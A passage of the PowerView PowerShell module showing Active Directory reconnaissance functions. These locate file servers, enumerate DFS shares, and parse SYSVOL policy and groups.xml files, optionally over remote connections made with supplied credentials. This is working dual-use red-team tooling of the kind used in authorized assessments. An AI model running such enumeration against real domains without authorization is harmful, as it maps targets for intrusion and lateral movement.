                    $UserContext = $GroupContext
                    $UserIdentity = $Member
                }
                Write-Verbose "[Remove-DomainGroupMember] Removing member '$Member' from group '$Identity'"
                $Member = [System.DirectoryServices.AccountManagement.Principal]::FindByIdentity($UserContext.Context, $UserIdentity)
                $Group.Members.Remove($Member)
                $Group.Save()
            }
        }
    }
}


function Get-DomainFileServer {
<#
.SYNOPSIS

Returns a list of servers likely functioning as file servers.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainSearcher  

.DESCRIPTION

Returns a list of likely fileservers by searching for all users in Active Directory
with non-null homedirectory, scriptpath, or profilepath fields, and extracting/uniquifying
the server names.

.PARAMETER Domain

Specifies the domain to use for the query, defaults to the current domain.

.PARAMETER LDAPFilter

Specifies an LDAP query string that is used to filter Active Directory objects.

.PARAMETER SearchBase

The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
Useful for OU queries.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Get-DomainFileServer

Returns active file servers for the current domain.

.EXAMPLE

Get-DomainFileServer -Domain testing.local

Returns active file servers for the 'testing.local' domain.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-DomainFileServer -Credential $Cred

.OUTPUTS

String

One or more strings representing file server names.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [Parameter( ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [Alias('DomainName', 'Name')]
        [String[]]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        function Split-Path {
            # short internal helper to split UNC server paths
            Param([String]$Path)

            if ($Path -and ($Path.split('\\').Count -ge 3)) {
                $Temp = $Path.split('\\')[2]
                if ($Temp -and ($Temp -ne '')) {
                    $Temp
                }
            }
        }

        $SearcherArguments = @{
            'LDAPFilter' = '(&(samAccountType=805306368)(!(userAccountControl:1.2.840.113556.1.4.803:=2))(|(homedirectory=*)(scriptpath=*)(profilepath=*)))'
            'Properties' = 'homedirectory,scriptpath,profilepath'
        }
        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
    }

    PROCESS {
        if ($PSBoundParameters['Domain']) {
            ForEach ($TargetDomain in $Domain) {
                $SearcherArguments['Domain'] = $TargetDomain
                $UserSearcher = Get-DomainSearcher @SearcherArguments
                # get all results w/o the pipeline and uniquify them (I know it's not pretty)
                $(ForEach($UserResult in $UserSearcher.FindAll()) {if ($UserResult.Properties['homedirectory']) {Split-Path($UserResult.Properties['homedirectory'])}if ($UserResult.Properties['scriptpath']) {Split-Path($UserResult.Properties['scriptpath'])}if ($UserResult.Properties['profilepath']) {Split-Path($UserResult.Properties['profilepath'])}}) | Sort-Object -Unique
            }
        }
        else {
            $UserSearcher = Get-DomainSearcher @SearcherArguments
            $(ForEach($UserResult in $UserSearcher.FindAll()) {if ($UserResult.Properties['homedirectory']) {Split-Path($UserResult.Properties['homedirectory'])}if ($UserResult.Properties['scriptpath']) {Split-Path($UserResult.Properties['scriptpath'])}if ($UserResult.Properties['profilepath']) {Split-Path($UserResult.Properties['profilepath'])}}) | Sort-Object -Unique
        }
    }
}


function Get-DomainDFSShare {
<#
.SYNOPSIS

Returns a list of all fault-tolerant distributed file systems
for the current (or specified) domains.

Author: Ben Campbell (@meatballs__)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainSearcher  

.DESCRIPTION

This function searches for all distributed file systems (either version
1, 2, or both depending on -Version X) by searching for domain objects
matching (objectClass=fTDfs) or (objectClass=msDFS-Linkv2), respectively
The server data is parsed appropriately and returned.

.PARAMETER Domain

Specifies the domains to use for the query, defaults to the current domain.

.PARAMETER SearchBase

The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
Useful for OU queries.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Get-DomainDFSShare

Returns all distributed file system shares for the current domain.

.EXAMPLE

Get-DomainDFSShare -Domain testlab.local

Returns all distributed file system shares for the 'testlab.local' domain.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-DomainDFSShare -Credential $Cred

.OUTPUTS

System.Management.Automation.PSCustomObject

A custom PSObject describing the distributed file systems.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseApprovedVerbs', '')]
    [OutputType('System.Management.Automation.PSCustomObject')]
    [CmdletBinding()]
    Param(
        [Parameter( ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [Alias('DomainName', 'Name')]
        [String[]]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [ValidateSet('All', 'V1', '1', 'V2', '2')]
        [String]
        $Version = 'All'
    )

    BEGIN {
        $SearcherArguments = @{}
        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }

        function Parse-Pkt {
            [CmdletBinding()]
            Param(
                [Byte[]]
                $Pkt
            )

            $bin = $Pkt
            $blob_version = [bitconverter]::ToUInt32($bin[0..3],0)
            $blob_element_count = [bitconverter]::ToUInt32($bin[4..7],0)
            $offset = 8
            #https://msdn.microsoft.com/en-us/library/cc227147.aspx
            $object_list = @()
            for($i=1; $i -le $blob_element_count; $i++){
                $blob_name_size_start = $offset
                $blob_name_size_end = $offset + 1
                $blob_name_size = [bitconverter]::ToUInt16($bin[$blob_name_size_start..$blob_name_size_end],0)

                $blob_name_start = $blob_name_size_end + 1
                $blob_name_end = $blob_name_start + $blob_name_size - 1
                $blob_name = [System.Text.Encoding]::Unicode.GetString($bin[$blob_name_start..$blob_name_end])

                $blob_data_size_start = $blob_name_end + 1
                $blob_data_size_end = $blob_data_size_start + 3
                $blob_data_size = [bitconverter]::ToUInt32($bin[$blob_data_size_start..$blob_data_size_end],0)

                $blob_data_start = $blob_data_size_end + 1
                $blob_data_end = $blob_data_start + $blob_data_size - 1
                $blob_data = $bin[$blob_data_start..$blob_data_end]
                switch -wildcard ($blob_name) {
                    "\siteroot" {  }
                    "\domainroot*" {
                        # Parse DFSNamespaceRootOrLinkBlob object. Starts with variable length DFSRootOrLinkIDBlob which we parse first...
                        # DFSRootOrLinkIDBlob
                        $root_or_link_guid_start = 0
                        $root_or_link_guid_end = 15
                        $root_or_link_guid = [byte[]]$blob_data[$root_or_link_guid_start..$root_or_link_guid_end]
                        $guid = New-Object Guid(,$root_or_link_guid) # should match $guid_str
                        $prefix_size_start = $root_or_link_guid_end + 1
                        $prefix_size_end = $prefix_size_start + 1
                        $prefix_size = [bitconverter]::ToUInt16($blob_data[$prefix_size_start..$prefix_size_end],0)
                        $prefix_start = $prefix_size_end + 1
                        $prefix_end = $prefix_start + $prefix_size - 1
                        $prefix = [System.Text.Encoding]::Unicode.GetString($blob_data[$prefix_start..$prefix_end])

                        $short_prefix_size_start = $prefix_end + 1
                        $short_prefix_size_end = $short_prefix_size_start + 1
                        $short_prefix_size = [bitconverter]::ToUInt16($blob_data[$short_prefix_size_start..$short_prefix_size_end],0)
                        $short_prefix_start = $short_prefix_size_end + 1
                        $short_prefix_end = $short_prefix_start + $short_prefix_size - 1
                        $short_prefix = [System.Text.Encoding]::Unicode.GetString($blob_data[$short_prefix_start..$short_prefix_end])

                        $type_start = $short_prefix_end + 1
                        $type_end = $type_start + 3
                        $type = [bitconverter]::ToUInt32($blob_data[$type_start..$type_end],0)

                        $state_start = $type_end + 1
                        $state_end = $state_start + 3
                        $state = [bitconverter]::ToUInt32($blob_data[$state_start..$state_end],0)

                        $comment_size_start = $state_end + 1
                        $comment_size_end = $comment_size_start + 1
                        $comment_size = [bitconverter]::ToUInt16($blob_data[$comment_size_start..$comment_size_end],0)
                        $comment_start = $comment_size_end + 1
                        $comment_end = $comment_start + $comment_size - 1
                        if ($comment_size -gt 0)  {
                            $comment = [System.Text.Encoding]::Unicode.GetString($blob_data[$comment_start..$comment_end])
                        }
                        $prefix_timestamp_start = $comment_end + 1
                        $prefix_timestamp_end = $prefix_timestamp_start + 7
                        # https://msdn.microsoft.com/en-us/library/cc230324.aspx FILETIME
                        $prefix_timestamp = $blob_data[$prefix_timestamp_start..$prefix_timestamp_end] #dword lowDateTime #dword highdatetime
                        $state_timestamp_start = $prefix_timestamp_end + 1
                        $state_timestamp_end = $state_timestamp_start + 7
                        $state_timestamp = $blob_data[$state_timestamp_start..$state_timestamp_end]
                        $comment_timestamp_start = $state_timestamp_end + 1
                        $comment_timestamp_end = $comment_timestamp_start + 7
                        $comment_timestamp = $blob_data[$comment_timestamp_start..$comment_timestamp_end]
                        $version_start = $comment_timestamp_end  + 1
                        $version_end = $version_start + 3
                        $version = [bitconverter]::ToUInt32($blob_data[$version_start..$version_end],0)

                        # Parse rest of DFSNamespaceRootOrLinkBlob here
                        $dfs_targetlist_blob_size_start = $version_end + 1
                        $dfs_targetlist_blob_size_end = $dfs_targetlist_blob_size_start + 3
                        $dfs_targetlist_blob_size = [bitconverter]::ToUInt32($blob_data[$dfs_targetlist_blob_size_start..$dfs_targetlist_blob_size_end],0)

                        $dfs_targetlist_blob_start = $dfs_targetlist_blob_size_end + 1
                        $dfs_targetlist_blob_end = $dfs_targetlist_blob_start + $dfs_targetlist_blob_size - 1
                        $dfs_targetlist_blob = $blob_data[$dfs_targetlist_blob_start..$dfs_targetlist_blob_end]
                        $reserved_blob_size_start = $dfs_targetlist_blob_end + 1
                        $reserved_blob_size_end = $reserved_blob_size_start + 3
                        $reserved_blob_size = [bitconverter]::ToUInt32($blob_data[$reserved_blob_size_start..$reserved_blob_size_end],0)

                        $reserved_blob_start = $reserved_blob_size_end + 1
                        $reserved_blob_end = $reserved_blob_start + $reserved_blob_size - 1
                        $reserved_blob = $blob_data[$reserved_blob_start..$reserved_blob_end]
                        $referral_ttl_start = $reserved_blob_end + 1
                        $referral_ttl_end = $referral_ttl_start + 3
                        $referral_ttl = [bitconverter]::ToUInt32($blob_data[$referral_ttl_start..$referral_ttl_end],0)

                        #Parse DFSTargetListBlob
                        $target_count_start = 0
                        $target_count_end = $target_count_start + 3
                        $target_count = [bitconverter]::ToUInt32($dfs_targetlist_blob[$target_count_start..$target_count_end],0)
                        $t_offset = $target_count_end + 1

                        for($j=1; $j -le $target_count; $j++){
                            $target_entry_size_start = $t_offset
                            $target_entry_size_end = $target_entry_size_start + 3
                            $target_entry_size = [bitconverter]::ToUInt32($dfs_targetlist_blob[$target_entry_size_start..$target_entry_size_end],0)
                            $target_time_stamp_start = $target_entry_size_end + 1
                            $target_time_stamp_end = $target_time_stamp_start + 7
                            # FILETIME again or special if priority rank and priority class 0
                            $target_time_stamp = $dfs_targetlist_blob[$target_time_stamp_start..$target_time_stamp_end]
                            $target_state_start = $target_time_stamp_end + 1
                            $target_state_end = $target_state_start + 3
                            $target_state = [bitconverter]::ToUInt32($dfs_targetlist_blob[$target_state_start..$target_state_end],0)

                            $target_type_start = $target_state_end + 1
                            $target_type_end = $target_type_start + 3
                            $target_type = [bitconverter]::ToUInt32($dfs_targetlist_blob[$target_type_start..$target_type_end],0)

                            $server_name_size_start = $target_type_end + 1
                            $server_name_size_end = $server_name_size_start + 1
                            $server_name_size = [bitconverter]::ToUInt16($dfs_targetlist_blob[$server_name_size_start..$server_name_size_end],0)

                            $server_name_start = $server_name_size_end + 1
                            $server_name_end = $server_name_start + $server_name_size - 1
                            $server_name = [System.Text.Encoding]::Unicode.GetString($dfs_targetlist_blob[$server_name_start..$server_name_end])

                            $share_name_size_start = $server_name_end + 1
                            $share_name_size_end = $share_name_size_start + 1
                            $share_name_size = [bitconverter]::ToUInt16($dfs_targetlist_blob[$share_name_size_start..$share_name_size_end],0)
                            $share_name_start = $share_name_size_end + 1
                            $share_name_end = $share_name_start + $share_name_size - 1
                            $share_name = [System.Text.Encoding]::Unicode.GetString($dfs_targetlist_blob[$share_name_start..$share_name_end])

                            $target_list += "\\$server_name\$share_name"
                            $t_offset = $share_name_end + 1
                        }
                    }
                }
                $offset = $blob_data_end + 1
                $dfs_pkt_properties = @{
                    'Name' = $blob_name
                    'Prefix' = $prefix
                    'TargetList' = $target_list
                }
                $object_list += New-Object -TypeName PSObject -Property $dfs_pkt_properties
                $prefix = $Null
                $blob_name = $Null
                $target_list = $Null
            }

            $servers = @()
            $object_list | ForEach-Object {
                if ($_.TargetList) {
                    $_.TargetList | ForEach-Object {
                        $servers += $_.split('\')[2]
                    }
                }
            }

            $servers
        }

        function Get-DomainDFSShareV1 {
            [CmdletBinding()]
            Param(
                [String]
                $Domain,

                [String]
                $SearchBase,

                [String]
                $Server,

                [String]
                $SearchScope = 'Subtree',

                [Int]
                $ResultPageSize = 200,

                [Int]
                $ServerTimeLimit,

                [Switch]
                $Tombstone,

                [Management.Automation.PSCredential]
                [Management.Automation.CredentialAttribute()]
                $Credential = [Management.Automation.PSCredential]::Empty
            )

            $DFSsearcher = Get-DomainSearcher @PSBoundParameters

            if ($DFSsearcher) {
                $DFSshares = @()
                $DFSsearcher.filter = '(&(objectClass=fTDfs))'

                try {
                    $Results = $DFSSearcher.FindAll()
                    $Results | Where-Object {$_} | ForEach-Object {
                        $Properties = $_.Properties
                        $RemoteNames = $Properties.remoteservername
                        $Pkt = $Properties.pkt

                        $DFSshares += $RemoteNames | ForEach-Object {
                            try {
                                if ( $_.Contains('\') ) {
                                    New-Object -TypeName PSObject -Property @{'Name'=$Properties.name[0];'RemoteServerName'=$_.split('\')[2]}
                                }
                            }
                            catch {
                                Write-Verbose "[Get-DomainDFSShare] Get-DomainDFSShareV1 error in parsing DFS share : $_"
                            }
                        }
                    }
                    if ($Results) {
                        try { $Results.dispose() }
                        catch {
                            Write-Verbose "[Get-DomainDFSShare] Get-DomainDFSShareV1 error disposing of the Results object: $_"
                        }
                    }
                    $DFSSearcher.dispose()

                    if ($pkt -and $pkt[0]) {
                        Parse-Pkt $pkt[0] | ForEach-Object {
                            # If a folder doesn't have a redirection it will have a target like
                            # \\null\TestNameSpace\folder\.DFSFolderLink so we do actually want to match
                            # on 'null' rather than $Null
                            if ($_ -ne 'null') {
                                New-Object -TypeName PSObject -Property @{'Name'=$Properties.name[0];'RemoteServerName'=$_}
                            }
                        }
                    }
                }
                catch {
                    Write-Warning "[Get-DomainDFSShare] Get-DomainDFSShareV1 error : $_"
                }
                $DFSshares | Sort-Object -Unique -Property 'RemoteServerName'
            }
        }

        function Get-DomainDFSShareV2 {
            [CmdletBinding()]
            Param(
                [String]
                $Domain,

                [String]
                $SearchBase,

                [String]
                $Server,

                [String]
                $SearchScope = 'Subtree',

                [Int]
                $ResultPageSize = 200,

                [Int]
                $ServerTimeLimit,

                [Switch]
                $Tombstone,

                [Management.Automation.PSCredential]
                [Management.Automation.CredentialAttribute()]
                $Credential = [Management.Automation.PSCredential]::Empty
            )

            $DFSsearcher = Get-DomainSearcher @PSBoundParameters

            if ($DFSsearcher) {
                $DFSshares = @()
                $DFSsearcher.filter = '(&(objectClass=msDFS-Linkv2))'
                $Null = $DFSSearcher.PropertiesToLoad.AddRange(('msdfs-linkpathv2','msDFS-TargetListv2'))

                try {
                    $Results = $DFSSearcher.FindAll()
                    $Results | Where-Object {$_} | ForEach-Object {
                        $Properties = $_.Properties
                        $target_list = $Properties.'msdfs-targetlistv2'[0]
                        $xml = [xml][System.Text.Encoding]::Unicode.GetString($target_list[2..($target_list.Length-1)])
                        $DFSshares += $xml.targets.ChildNodes | ForEach-Object {
                            try {
                                $Target = $_.InnerText
                                if ( $Target.Contains('\') ) {
                                    $DFSroot = $Target.split('\')[3]
                                    $ShareName = $Properties.'msdfs-linkpathv2'[0]
                                    New-Object -TypeName PSObject -Property @{'Name'="$DFSroot$ShareName";'RemoteServerName'=$Target.split('\')[2]}
                                }
                            }
                            catch {
                                Write-Verbose "[Get-DomainDFSShare] Get-DomainDFSShareV2 error in parsing target : $_"
                            }
                        }
                    }
                    if ($Results) {
                        try { $Results.dispose() }
                        catch {
                            Write-Verbose "[Get-DomainDFSShare] Error disposing of the Results object: $_"
                        }
                    }
                    $DFSSearcher.dispose()
                }
                catch {
                    Write-Warning "[Get-DomainDFSShare] Get-DomainDFSShareV2 error : $_"
                }
                $DFSshares | Sort-Object -Unique -Property 'RemoteServerName'
            }
        }
    }

    PROCESS {
        $DFSshares = @()

        if ($PSBoundParameters['Domain']) {
            ForEach ($TargetDomain in $Domain) {
                $SearcherArguments['Domain'] = $TargetDomain
                if ($Version -match 'all|1') {
                    $DFSshares += Get-DomainDFSShareV1 @SearcherArguments
                }
                if ($Version -match 'all|2') {
                    $DFSshares += Get-DomainDFSShareV2 @SearcherArguments
                }
            }
        }
        else {
            if ($Version -match 'all|1') {
                $DFSshares += Get-DomainDFSShareV1 @SearcherArguments
            }
            if ($Version -match 'all|2') {
                $DFSshares += Get-DomainDFSShareV2 @SearcherArguments
            }
        }

        $DFSshares | Sort-Object -Property ('RemoteServerName','Name') -Unique
    }
}


########################################################
#
# GPO related functions.
#
########################################################

function Get-GptTmpl {
<#
.SYNOPSIS

Helper to parse a GptTmpl.inf policy file path into a hashtable.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Add-RemoteConnection, Remove-RemoteConnection, Get-IniContent  

.DESCRIPTION

Parses a GptTmpl.inf into a custom hashtable using Get-IniContent. If a
GPO object is passed, GPOPATH\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf
is constructed and assumed to be the parse target. If -Credential is passed,
Add-RemoteConnection is used to mount \\TARGET\SYSVOL with the specified creds,
the files are parsed, and the connection is destroyed later with Remove-RemoteConnection.

.PARAMETER GptTmplPath

Specifies the GptTmpl.inf file path name to parse.

.PARAMETER OutputObject

Switch. Output a custom PSObject instead of a hashtable.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the remote system.

.EXAMPLE

Get-GptTmpl -GptTmplPath "\\dev.testlab.local\sysvol\dev.testlab.local\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf"

Parse the default domain policy .inf for dev.testlab.local

.EXAMPLE

Get-DomainGPO testing | Get-GptTmpl

Parse the GptTmpl.inf policy for the GPO with display name of 'testing'.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-GptTmpl -Credential $Cred -GptTmplPath "\\dev.testlab.local\sysvol\dev.testlab.local\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf"

Parse the default domain policy .inf for dev.testlab.local using alternate credentials.

.OUTPUTS

Hashtable

Ouputs a hashtable representing the parsed GptTmpl.inf file.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([Hashtable])]
    [CmdletBinding()]
    Param (
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('gpcfilesyspath', 'Path')]
        [String]
        $GptTmplPath,

        [Switch]
        $OutputObject,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $MappedPaths = @{}
    }

    PROCESS {
        try {
            if (($GptTmplPath -Match '\\\\.*\\.*') -and ($PSBoundParameters['Credential'])) {
                $SysVolPath = "\\$((New-Object System.Uri($GptTmplPath)).Host)\SYSVOL"
                if (-not $MappedPaths[$SysVolPath]) {
                    # map IPC$ to this computer if it's not already
                    Add-RemoteConnection -Path $SysVolPath -Credential $Credential
                    $MappedPaths[$SysVolPath] = $True
                }
            }

            $TargetGptTmplPath = $GptTmplPath
            if (-not $TargetGptTmplPath.EndsWith('.inf')) {
                $TargetGptTmplPath += '\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf'
            }

            Write-Verbose "[Get-GptTmpl] Parsing GptTmplPath: $TargetGptTmplPath"

            if ($PSBoundParameters['OutputObject']) {
                $Contents = Get-IniContent -Path $TargetGptTmplPath -OutputObject -ErrorAction Stop
                if ($Contents) {
                    $Contents | Add-Member Noteproperty 'Path' $TargetGptTmplPath
                    $Contents
                }
            }
            else {
                $Contents = Get-IniContent -Path $TargetGptTmplPath -ErrorAction Stop
                if ($Contents) {
                    $Contents['Path'] = $TargetGptTmplPath
                    $Contents
                }
            }
        }
        catch {
            Write-Verbose "[Get-GptTmpl] Error parsing $TargetGptTmplPath : $_"
        }
    }

    END {
        # remove the SYSVOL mappings
        $MappedPaths.Keys | ForEach-Object { Remove-RemoteConnection -Path $_ }
    }
}


function Get-GroupsXML {
<#
.SYNOPSIS

Helper to parse a groups.xml file path into a custom object.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Add-RemoteConnection, Remove-RemoteConnection, ConvertTo-SID  

.DESCRIPTION

Parses a groups.xml into a custom object. If -Credential is passed,
Add-RemoteConnection is used to mount \\TARGET\SYSVOL with the specified creds,
the files are parsed, and the connection is destroyed later with Remove-RemoteConnection.

.PARAMETER GroupsXMLpath

Specifies the groups.xml file path name to parse.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the remote system.

.OUTPUTS

PowerView.GroupsXML
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.GroupsXML')]
    [CmdletBinding()]
    Param (
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Path')]
        [String]
        $GroupsXMLPath,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $MappedPaths = @{}
    }

    PROCESS {
        try {
            if (($GroupsXMLPath -Match '\\\\.*\\.*') -and ($PSBoundParameters['Credential'])) {
                $SysVolPath = "\\$((New-Object System.Uri($GroupsXMLPath)).Host)\SYSVOL"
                if (-not $MappedPaths[$SysVolPath]) {
                    # map IPC$ to this computer if it's not already
                    Add-RemoteConnection -Path $SysVolPath -Credential $Credential
                    $MappedPaths[$SysVolPath] = $True
                }
            }

            [XML]$GroupsXMLcontent = Get-Content -Path $GroupsXMLPath -ErrorAction Stop

            # process all group properties in the XML
            $GroupsXMLcontent | Select-Xml "/Groups/Group" | Select-Object -ExpandProperty node | ForEach-Object {

                $Groupname = $_.Properties.groupName

                # extract the localgroup sid for memberof
                $GroupSID = $_.Properties.groupSid
                if (-not $GroupSID) {
                    if ($Groupname -match 'Administrators') {
                        $GroupSID = 'S-1-5-32-544'
                    }
                    elseif ($Groupname -match 'Remote Desktop') {
                        $GroupSID = 'S-1-5-32-555'
                    }
                    elseif ($Groupname -match 'Guests') {
                        $GroupSID = 'S-1-5-32-546'
                    }
                    else {
                        if ($PSBoundParameters['Credential']) {
                            $GroupSID = ConvertTo-SID -ObjectName $Groupname -Credential $Credential
                        }
                        else {
                            $GroupSID = ConvertTo-SID -ObjectName $Groupname
                        }
                    }
                }

                # extract out members added to this group
                $Members = $_.Properties.members | Select-Object -ExpandProperty Member | Where-Object { $_.action -match 'ADD' } | ForEach-Object {
                    if ($_.sid) { $_.sid }
                    else { $_.name }
                }

                if ($Members) {
                    # extract out any/all filters...I hate you GPP
                    if ($_.filters) {
                        $Filters = $_.filters.GetEnumerator() | ForEach-Object {
                            New-Object -TypeName PSObject -Property @{'Type' = $_.LocalName;'Value' = $_.name}
                        }
                    }
                    else {
                        $Filters = $Null
                    }

                    if ($Members -isnot [System.Array]) { $Members = @($Members) }

                    $GroupsXML = New-Object PSObject
                    $GroupsXML | Add-Member Noteproperty 'GPOPath' $TargetGroupsXMLPath
                    $GroupsXML | Add-Member Noteproperty 'Filters' $Filters
                    $GroupsXML | Add-Member Noteproperty 'GroupName' $GroupName
                    $GroupsXML | Add-Member Noteproperty 'GroupSID' $GroupSID
                    $GroupsXML | Add-Member Noteproperty 'GroupMemberOf' $Null
                    $GroupsXML | Add-Member Noteproperty 'GroupMembers' $Members
                    $GroupsXML.PSObject.TypeNames.Insert(0, 'PowerView.GroupsXML')
                    $GroupsXML
                }
            }
        }
        catch {
            Write-Verbose "[Get-GroupsXML] Error parsing $TargetGroupsXMLPath : $_"
        }
    }

    END {
        # remove the SYSVOL mappings
        $MappedPaths.Keys | ForEach-Object { Remove-RemoteConnection -Path $_ }
    }
}


function Get-DomainGPO {
<#
.SYNOPSIS

Return all GPOs or specific GPO objects in AD.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainSearcher, Get-DomainComputer, Get-DomainUser, Get-DomainOU, Get-NetComputerSiteName, Get-DomainSite, Get-DomainObject, Convert-LDAPProperty  

.DESCRIPTION

Builds a directory searcher object using Get-DomainSearcher, builds a custom
LDAP filter based on targeting/filter parameters, and searches for all objects
matching the criteria. To only return specific properties, use
"-Properties samaccountname,usnchanged,...". By default, all GPO objects for
the current domain are returned. To enumerate all GPOs that are applied to
a particular machine, use -ComputerName X.

.PARAMETER Identity

A display name (e.g. 'Test GPO'), DistinguishedName (e.g. 'CN={F260B76D-55C8-46C5-BEF1-9016DD98E272},CN=Policies,CN=System,DC=testlab,DC=local'),
GUID (e.g. '10ec320d-3111-4ef4-8faf-8f14f4adc789'), or GPO name (e.g. '{F260B76D-55C8-46C5-BEF1-9016DD98E272}'). Wildcards accepted.

.PARAMETER ComputerIdentity

Return all GPO objects applied to a given computer identity (name, dnsname, DistinguishedName, etc.).

.PARAMETER UserIdentity

Return all GPO objects applied to a given user identity (name, SID, DistinguishedName, etc.).

.PARAMETER Domain

Specifies the domain to use for the query, defaults to the current domain.

.PARAMETER LDAPFilter

Specifies an LDAP query string that is used to filter Active Directory objects.

.PARAMETER Properties

Specifies the properties of the output object to retrieve from the server.

.PARAMETER SearchBase

The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
Useful for OU queries.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

